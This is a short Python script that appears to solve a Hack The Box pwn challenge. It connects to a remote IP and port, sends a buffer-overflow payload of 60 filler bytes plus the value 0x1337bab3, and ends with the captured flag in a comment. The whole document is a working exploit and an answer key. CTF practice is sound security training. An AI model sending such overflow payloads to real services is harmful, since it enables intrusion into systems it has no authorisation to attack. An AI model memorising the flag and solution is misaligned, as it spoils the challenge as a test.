import socket

HOST = "104.248.175.144"
PORT = 31406

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	sock.connect((HOST,PORT))
	data = b"A"*60 + b"\xb3\xba\x37\x13\n"
	sock.send(data)
	dataFromServer = sock.recv(1024)
	print(dataFromServer)
except socket.error:
	print("Failed to send data")

#HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}
